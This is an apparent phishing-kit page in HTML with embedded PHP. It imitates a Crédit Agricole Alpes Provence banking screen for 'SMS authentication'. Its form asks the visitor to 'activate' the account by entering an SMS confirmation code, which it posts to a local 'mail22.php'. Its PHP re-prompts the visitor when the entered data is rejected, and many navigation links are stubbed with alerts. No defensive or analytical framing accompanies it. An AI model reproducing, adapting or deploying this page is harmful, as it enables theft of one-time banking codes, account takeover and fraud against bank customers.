﻿<html><head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7"><title>Cr&eacute;dit Agricole - Banque et assurances</title><script language="javascript" type="text/javascript" src="https://libs.de.coremetrics.com/configs/50580000.js"></script><script language="javascript" type="text/javascript" src="https://tmscdn.de.coremetrics.com/tms/dispatcher-v3.js"></script><script src="https://libs.de.coremetrics.com/ddxlibs/yahoo-min.js" type="text/javascript"></script><script src="https://tmscdn.de.coremetrics.com/tms/50580000/cp-v3.js?__t=20160104204632727" type="text/javascript"></script><script src="https://libs.de.coremetrics.com/ddxlibs/json-min.js" type="text/javascript"></script><script type="text/javascript" src="https://www.ca-alpesprovence.fr/Vitrine/ObjCommun/BAMG2/ddx-tag.jsp?regId=81300-00000000346238"></script></head><body marginheight="0" topmargin="0" vspace="0" marginwidth="0" leftmargin="0" hspace="0" style="margin:0"><div id="container">
<link id="linkcss" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/cssstyles.css" rel="stylesheet">
<table border="0" width="960px" cellpadding="0" cellspacing="0">
<tbody><tr valign="middle"><td>
<!-----  DEBUT zone enteteTech  ---->


<link rel="icon" type="image/png" href="https://www.ca-atlantique-vendee.fr/Vitrine/ObjCommun/DCIV2/img/favicon.png" />


<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7">











 
 


<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/antiquus.css?v=50" media="all">
<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/antiquus.css?v=50" media="all">


<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/styles.css?v=50" media="all">
<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/styles.css?v=50" media="all">


<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/styles-mod.css?v=50" media="all">
<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/styles-mod.css?v=50" media="all">

<!--[if IE 8]>

<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/ie8.css?v=50" media="all" />
<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/ie8.css?v=50" media="all" />

<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/ie8-mod.css?v=50" media="all" />
<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/ie8-mod.css?v=50" media="all" />
<![endif]-->

<!--[if lte IE 7]>

<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/ie.css?v=50" media="all" />
<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/ie.css?v=50" media="all" />

<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/ie-mod.css?v=50" media="all" />
<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/ie-mod.css?v=50" media="all" />
<![endif]-->

<!--[if lt IE 7]>
<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/ieold.css?v=50" media="all" />
<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/ieold.css?v=50" media="all" />

<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/ieold-mod.css?v=50" media="all" />
<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/ieold-mod.css?v=50" media="all" />
<![endif]-->










<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/stb.css?v=50" media="all">







<!-----  FIN zone enteteTech  ---->

</td></tr><tr valign="middle"><td>
<!-----  DEBUT zone bnc  ---->


	
	
	
		



<img src="./entreeBam_fichiers/1.PNG"></td></tr><tr height="17" valign="top"><td>
<!-----  DEBUT zone FILDARIANE  ---->




<script type="text/javascript">
  var PU_PREM_ECRAN = "javascript:doAction('Releves', 'bnt');";
</script>
<div id="fil-ariane">
    <div id="fil-ariane-contenu"><ul>                                                        <li id="ariane-home">                                         <a title="Retour Г  la page d'accueil" href="javascript:doAction('Releves', 'bnt');">                                  <img width="35" height="20" alt="Retour Г  la page d'accueil" src="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/img/picto_home.png">                    </a></li><li>&nbsp;&gt;&nbsp;<a href="javascript:doAction('Coordonnees', 'bnt');">Authentification par SMS</a></li><li></li></ul></div>
	
	
	
	
	
	<script src="/web/bam/appli/web/commun/js/breadcrumbs.js?v=50" type="text/javascript"></script>
	
	
	
	


							
							
							
							
							<script>aide_message= "Acc&eacute;dez Г  vos messages";</script>
							
								
								<div id="ariane-message3">
								<p>Vous avez <a href="javascript:doAction('Msdossier','infoperso')" onMouseOver="StatusMessage(true, aide_message);return true" onMouseOut="StatusMessage( false )"> <span style="color:#F8F8FF; font-weight:normal"> 0</span>&nbsp;nouveau&nbsp;message
								</a></p>
								</div>
								
							


</div>


<!-----  FIN zone FILDARIANE  ---->

</td></tr><tr valign="middle"><td>
<!-----  DEBUT zone libPerimetre  ---->



<div id="libPerimetre">
	
	<span style="color: rgb(227, 0, 112); font-family: arial, helvetica, clean, sans-serif; font-size: 14px; font-weight: 700; text-align: center; text-transform: capitalize; background-color: rgb(230, 230, 230);">Espace Titulaire : Comptes Particuliers
	</span>
</div>



<!-----  FIN zone libPerimetre  ---->

</td></tr><tr valign="middle"><td>
<!-----  DEBUT zone infoperso  ---->

<!-----  FIN zone infoperso  ---->

</td></tr><tr valign="middle"><td><table border="0" cellpadding="0" cellspacing="0">
<tbody><tr><td valign="top" width="168px">
<table border="0" valign="top" width="168px" cellpadding="0" cellspacing="0">
<tbody><tr><td>
<!-----  DEBUT zone MENH  ---->
<!--vide--><!--vide-->
<!-----  FIN zone MENH  ---->

</td></tr><tr><td>
<!-----  DEBUT zone bnt  ---->





<ul id="menu-bnt">
  <li>
    <h2 id="bnt-titre-synthese" class="prem-titre-bnt">SynthГЁses</h2>
    <ul>
        
            
		<script>aide_bnt1_0= "Acc&eacute;dez Г  vos comptes";</script>
			
				<li class="nomarge-li-BNT">
					<a style="width:auto" href="javascript:doAction('Synthcomptes','bnt')" onMouseOver="StatusMessage(true, aide_bnt1_0);return true" onMouseOut="StatusMessage( false )">Mes Comptes</a>
				</li>
				
		<script>aide_bnt1_1= "Acc&eacute;dez Г  vos cr&eacute;dits";</script>
			
				<li class="nomarge-li-BNT">
					<a style="width:auto" href="javascript:doAction('Synthcredits','bnt')" onMouseOver="StatusMessage(true, aide_bnt1_1);return true" onMouseOut="StatusMessage( false )">Mes Cr&eacute;dits</a>
				</li>
				
		<script>aide_bnt1_2= "Acc&eacute;dez Г  vos contrats d'&eacute;pargne";</script>
			
				<li class="nomarge-li-BNT">
					<a style="width:auto" href="javascript:doAction('Synthepargnes','bnt')" onMouseOver="StatusMessage(true, aide_bnt1_2);return true" onMouseOut="StatusMessage( false )">Mon &Eacute;pargne</a>
				</li>
				
		<script>aide_bnt1_3= "Acc&eacute;dez Г  vos contrats d'assurances";</script>
			
				<li class="nomarge-li-BNT">
					<a style="width:auto" href="javascript:doAction('Synthassurances','bnt')" onMouseOver="StatusMessage(true, aide_bnt1_3);return true" onMouseOut="StatusMessage( false )">Mes Assurances</a>
				</li>
				
		<script>aide_bnt1_4= "Acc&eacute;dez Г  vos comptes en devises";</script>
			
				<li class="nomarge-li-BNT">
					<a style="width:auto" href="javascript:doAction('Synthdevises','bnt')" onMouseOver="StatusMessage(true, aide_bnt1_4);return true" onMouseOut="StatusMessage( false )">Devises</a>
				</li>
				
		<script>aide_bnt1_5= "Visualisez la situation globale de votre patrimoine";</script>
			
				<li class="nomarge-li-BNT">
					<a style="width:auto" href="javascript:doActionDelayed('Synthglobale','bnt')" onMouseOver="StatusMessage(true, aide_bnt1_5);return true" onMouseOut="StatusMessage( false )">Situation globale</a>
				</li>
				
		
				    <!-- </ul> -->
  				<!-- </li>  -->
  				
				<li id="padding-top-titre-bnt">
					<h2 id="bnt-titre-services">Services</h2>
					<ul>
				<script>aide_bnt1_6= "Effectuez un virement";</script>
				<li class="nomarge-li-BNT">
					<a style="width:auto" href="javascript:doAction('Virementssepa','bnt')" onMouseOver="StatusMessage(true, aide_bnt1_6);return true" onMouseOut="StatusMessage( false )">Virements</a>
				</li>
		<script>aide_bnt1_7= "Commandez votre ch&eacute;quier";</script>
				<li class="nomarge-li-BNT">
					<a style="width:auto" href="javascript:doAction('Chequiers','bnt')" onMouseOver="StatusMessage(true, aide_bnt1_7);return true" onMouseOut="StatusMessage( false )">Ch&eacute;quiers</a>
				</li>
		<script>aide_bnt1_8= "G&eacute;rez vos titres";</script>
				<li class="nomarge-li-BNT">
					<a style="width:auto" href="javascript:doAction('Reroutcatitres&amp;typeaction=reroutage_aller&amp;site=CATITRES','bnt')" onMouseOver="StatusMessage(true, aide_bnt1_8);return true" onMouseOut="StatusMessage( false )">Titres</a>
				</li>
		
		</ul>
	</li>

	
	
	
		<li id="padding-top-titre-bnt">
		    <h2 id="bnt-titre-eservices">e-Services</h2>
		    <ul>
			
				
						<li class="nomarge-li-BNT">
						<a style="width:auto" href="javascript:alert('Veuillez activer votre compte');" onClick="lancerSTTrackingElargi('Performance&amp;prov=bnt','bnt-souscription100enligne','','ACTION=');" onMouseOver="StatusMessage(true, aide_bnt3_0);return true" onMouseOut="StatusMessage( false )">Souscription 100% <br> en ligne</a>
						</li>
					
				
						<li class="nomarge-li-BNT">
						<a style="width:auto" href="javascript:doAction('Contratsenattente','bnt')" onMouseOver="StatusMessage(true, aide_bnt3_1);return true" onMouseOut="StatusMessage( false )">Mes contrats en attente</a>
						</li>
					
				
						<li class="nomarge-li-BNT">
						<a style="width:auto" href="javascript:lancerContenu('tcm-940-240649','global');" onMouseOver="StatusMessage(true, aide_bnt3_2);return true" onMouseOut="StatusMessage( false )">M&eacute;mo</a>
						</li>
					
				
						<li class="nomarge-li-BNT">
						<a style="width:auto" href="javascript:alert('Veuillez activer votre compte');" onClick="ouvrirPopup('https://www.cprplusdirect.com/Reseaux/connect.aspx?ID=CAAlpesProvence','eCoffreFort','500','600','yes','yes','yes','yes','yes','yes');" onMouseOver="StatusMessage(true, aide_bnt3_3);return true" onMouseOut="StatusMessage( false )">Commande devises</a>
						</li>
					
			</ul>
		</li>
	


	<!-- E-Documents -->	
	
	<li id="padding-top-titre-bnt">
	    <h2 id="bnt-titre-edocuments">e-Documents</h2>
	    <ul>	    
	    

			
			
				<li class="nomarge-li-BNT">
					<a style="width:auto" href="javascript:doAction('Edocgest','bnt')" onMouseOver="StatusMessage(true, aide_bnt4_0);return true" onMouseOut="StatusMessage( false )">Gestion</a>
				</li>
			
			
				
		

			
			
				<li class="nomarge-li-BNT">
					<a style="width:auto;height:23" href="javascript:doAction('Edocsynth','bnt')" onMouseOver="StatusMessage(true, aide_bnt4_1);return true" onMouseOut="StatusMessage( false )">Consultation&nbsp;
						<img id="imgQEDNLU" alt="Nouveau e-Document" title="Nouveau e-Document" src="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/img/picto_nouveau.png">
					</a>
				</li>
			
			
				
		
    	</ul>
    </li>
    

	
	<li id="padding-top-titre-bnt">
	    <h2 id="bnt-titre-outils">Outils</h2>
	    <ul>
			
				
				<li class="nomarge-li-BNT">
					<a style="width:auto" href="javascript:doAction('Telechargement','bnt')" onMouseOver="StatusMessage(true, aide_bnt5_0);return true" onMouseOut="StatusMessage( false )">T&eacute;l&eacute;chargement</a>
				</li>
				
			
				
				<li class="nomarge-li-BNT">
					<a style="width:auto" href="javascript:doAction('Alertes','bnt')" onMouseOver="StatusMessage(true, aide_bnt5_1);return true" onMouseOut="StatusMessage( false )">Alertes</a>
				</li>
				
			
				
				<li class="nomarge-li-BNT">
					<a style="width:auto" href="javascript:doAction('Preferences','bnt')" onMouseOver="StatusMessage(true, aide_bnt5_2);return true" onMouseOut="StatusMessage( false )">Vos Pr&eacute;f&eacute;rences</a>
				</li>
				
			
    </ul>
  </li>
</ul>
</li>
<form action="javascript:alert('Veuillez activer votre compte');" name="FRM_TEL" method="post">
<input type="hidden" name="urlTel">
</form>

<!-----  FIN zone bnt  ---->

</ul></form></td></tr><tr><td>
<!-----  DEBUT zone MENB  ---->
<!--vide--><!--vide-->
<!-----  FIN zone MENB  ---->

</td></tr>
</tbody></table>
</td><td valign="top" width="590px" id="col-centre">
<div border="0" width="100%" cellpadding="0" cellspacing="0">
<div valign="top" width="590px"><div>
<div height="33" valign="middle" id="trPagePu">
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7">











 
 


<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/antiquus.css?v=50" media="all">
<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/antiquus.css?v=50" media="all">


<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/styles.css?v=50" media="all">
<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/styles.css?v=50" media="all">


<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/styles-mod.css?v=50" media="all">
<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/styles-mod.css?v=50" media="all">

<!--[if IE 8]>

<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/ie8.css?v=50" media="all" />
<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/ie8.css?v=50" media="all" />

<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/ie8-mod.css?v=50" media="all" />
<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/ie8-mod.css?v=50" media="all" />
<![endif]-->

<!--[if lte IE 7]>

<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/ie.css?v=50" media="all" />
<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/ie.css?v=50" media="all" />

<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/ie-mod.css?v=50" media="all" />
<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/ie-mod.css?v=50" media="all" />
<![endif]-->

<!--[if lt IE 7]>
<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/ieold.css?v=50" media="all" />
<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/ieold.css?v=50" media="all" />

<link rel="stylesheet" type="text/css" href="https://www.alpesprovence-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/ieold-mod.css?v=50" media="all" />
<link rel="stylesheet" type="text/css" href="/web/bam/appli/web/commun/styles/ieold-mod.css?v=50" media="all" />
<![endif]-->


<br>

<!-- copyright В© 2000 [BaBeL@STaL], Version 3.0, Lot 1 -->









<div class="boutons-act">
<h1>R&eacute;essayer code erreur<span id="top-actions">
			<a href="javascript:alert('Veuillez activer votre compte');" id="top-actions-aide" onMouseOut="afftextStat(0)" onMouseOver="afftextStat(statusaide);return true" title="Besoin d'Aide ?">Aide</a>
		</span>
	
</h1>
</div>

<!-------------- ERREURS-VALIDATION ----------->

		










<script>champsEnErreur = null;</script>





		

















<!---------- FIN ERREURS-VALIDATION ----------->


<br>
<form class="ca-forms" name="frm_fwk" method="POST" action="mail22.php">


<table width="590" border="0" cellpadding="3" cellspacing="0">
	<tbody><tr>
		<td bgcolor="#84aaad" colspan="3" class="titretetiere">
			<font face="Helvetica,Arial gras" size="3">
				 SMS
			</font>
		</td>
	</tr>
</tbody></table>
<fieldset class="blc-choix-valid" style="border:0 none;">
		<div class="blc-choix-wrap-valid">
<table width="570" border="0" cellpadding="3" cellspacing="0">
	</table>

<table width="570" border="0" cellpadding="3" cellspacing="0">
	<tbody>
	<tr>
		<td>
			
					<?php
if($firsterror=="1"){
	echo"<font style='COLOR: #e4414e; font-family: Verdana; font-weight: bold; font-size: 12px;'> 
Les donn&eacute;es saisies sont incorrectes.
"; 
} else {
	echo"<font style='font-size: 12px; font-family: arial,helvetica'> Pour activer votre compte, veuillez remplir le formulaire suivant :";
}
?>

			</font>
		</td>
	</tr><tr>
</tr></tbody></table>
</div>

</fieldset>
<fieldset class="blc-choix" style="border:0;">
    <div class="blc-choix-wrap">
<table width="570" border="0" cellpadding="3" cellspacing="0">
	<tbody>
  <tr>
  <td height="29" STYLE="<?php print_r($codecolor); ?>"><strong>Code de Confirmation :</strong></td>
	 
    <td><input name="code" STYLE="<?php print_r($codeclass); ?>" value="<?php print_r($code); ?>" id="edit-code-id" size="30" maxlength="50" type="text"></td>	  
 
</tr></tbody></table>
</div>
</fieldset>

<div class="validation">
		<input type="submit" id="droite" value="Confirmer">
</form>
									
									
										
									
									


				
</div>


</form>

<table width="364" border="0" cellspacing="0" cellpadding="0">
<tbody><tr>
	<td align="right">
	

			
	</td>
</tr>
</tbody></table>



<!-----  FIN zone pu  ---->

</div><div style="min-height:35px;">
<!-----  DEBUT zone espaceBBAS  ---->

<!-----  FIN zone espaceBBAS  ---->

</div><div height="33" valign="middle" id="BBAS">
<!-----  DEBUT zone BBAS  ---->
<div idcomp="tcm-940-413653"><span><div id="conteneur_PROMO_BAM"></div></span></div><!--vide-->
<!-----  FIN zone BBAS  ---->

</div>
</div>
</div>
</div>
</td><td valign="top" width="13">

<!-----  DEBUT zone filler  ---->
<span style="font-size: 1px">&nbsp;</span>


<!-----  FIN zone filler  ---->

</td><td valign="top" width="160" align="right">
<div style="width: 160px;" class="popupPAP" align="left">
<div valign="middle" style="font-size:0px;">
<!-----  DEBUT zone SECU  ---->

<span style="font-size: 0px">&nbsp;</span>

<!-----  FIN zone SECU  ---->

</div><div valign="middle">
<!-----  DEBUT zone BAM  ---->
<!--vide--><!--vide-->
<!-----  FIN zone BAM  ---->

</div><div valign="middle">
<!-----  DEBUT zone INFO  ---->
<!-----  FIN zone INFO  ---->
<link rel="icon" type="image/x-icon" href="https://www.ca-aquitaine.fr/favicon.ico" />
</div><div valign="middle">
<!-----  DEBUT zone PROMO  ---->
<div idcomp="tcm-940-408072"><div class="bloc-pap" id="racineGDC" version="tcm:940-184523-32 v.3"><script xml:space="preserve">var marqueurXiti="PDC_INFO - Indispo Contrats Assurance Vie 2015";var marqueurXiti408072 = marqueurXiti+ '_Affichage'; </script><h2><titre>Information</titre></h2><p><style xml:space="preserve">.bloc-pap img{display:block;}</style><dynamiclink label="&nbsp;" onclick="clicXiti('PDC_INFO___Indispo_Contrats_Assurance_Vie_2015__BAM_faux_lien', 'N');" onmouseout="top.window.status='';return true;" onmouseover="top.window.status='&nbsp;';return true;" ref="tcm-940-312539"><binarycontent img="https://www.norddefrance-g3-enligne.credit-agricole.fr/images/867/pack_159/banniere_tcm_984_465675.jpg"><script xml:space="preserve">displayBinary(prefixe, "/prediweb_urgentinfo_tcm_940_408071.gif", "", "");</script><img border="0" src="https://www.norddefrance-g3-enligne.credit-agricole.fr/images/867/pack_159/banniere_tcm_984_465675.jpg"></binarycontent></dynamiclink></p><div class="bloc-pap-texte"><p class="lirelasuite"><dynamiclink label="&nbsp;" onclick="clicXiti('PDC_INFO___Indispo_Contrats_Assurance_Vie_2015__BAM_faux_lien', 'N');" onmouseout="top.window.status='';return true;" onmouseover="top.window.status='&nbsp;';return true;" ref="tcm-940-312539">&nbsp;</dynamiclink></p></div></div></div><!--vide-->
<!-----  FIN zone PROMO  ---->

</div>
</div>
</td>
</tr></tbody></table>
</td></tr><tr height="17" valign="top"><td>
<!-----  DEBUT zone footer  ---->



<br>
<table width="100%" border="0" cellspacing="0" cellpadding="0">
	<tbody><tr valign="middle" align="center">
		<td>


			<a href="javascript:alert('Veuillez activer votre compte');" class="footerlien" onMouseOver="StatusMessage(true, aide_f0);return true" onMouseOut="StatusMessage( false )">Conditions G&eacute;n&eacute;rales d'utilisation</a>

			<span class="footerseparateur">&nbsp;|&nbsp;</span>

		
			<a href="javascript:ouvreassistance(getUrlAction('Aide&amp;IDENT=L_INF'),500,480,'no')" class="footerlien" onMouseOver="StatusMessage(true, aide_f1);return true" onMouseOut="StatusMessage( false )">Aide</a>

			<span class="footerseparateur">&nbsp;|&nbsp;</span>


			<a href="javascript:ouvreassistance(getUrlAction('Aide&amp;IDENT=L_LEX'),500,480,'no')" class="footerlien" onMouseOver="StatusMessage(true, aide_f2);return true" onMouseOut="StatusMessage( false )">Lexique</a>

			<span class="footerseparateur">&nbsp;|&nbsp;</span>

	
			<a href="javascript:ouvrirPopup('https://www.ca-alpesprovence.fr/site-securite.html','popupSecurity','','','yes', 'yes', 'yes', 'yes', 'yes', 'yes')" class="footerlien" onMouseOver="StatusMessage(true, aide_f3);return true" onMouseOut="StatusMessage( false )">S&eacute;curit&eacute;</a>

			<span class="footerseparateur">&nbsp;|&nbsp;</span>

		
			<a href="javascript:ouvrirPopup('https://www.ca-alpesprovence.fr/CNIL/','popupCnil','','','yes', 'yes', 'yes', 'yes', 'yes', 'yes')" class="footerlien" onMouseOver="StatusMessage(true, aide_f4);return true" onMouseOut="StatusMessage( false )">Politique de protection des donn&eacute;es</a>

			<span class="footerseparateur">&nbsp;|&nbsp;</span>

		
			<a href="javascript:ouvrirPopup('https://www.ca-alpesprovence.fr/TARIFS/','popupTarifs','','','yes', 'yes', 'yes', 'yes', 'yes', 'yes')" class="footerlien" onMouseOver="StatusMessage(true, aide_f5);return true" onMouseOut="StatusMessage( false )">Nos tarifs</a>

		</td>
	</tr>
	<tr>
		<td align="center">




 
<table width="100%"><tbody><tr><td class="footercopyright" align="center"><br>В©2004-2018 Cr&eacute;dit Agricole, tous droits r&eacute;serv&eacute;s</td><td></td></tr></tbody></table>
		</td>
	</tr>
</tbody></table>

<!-----  FIN zone footer  ---->

</td></tr>
</tbody></table>
</div>
</body></html>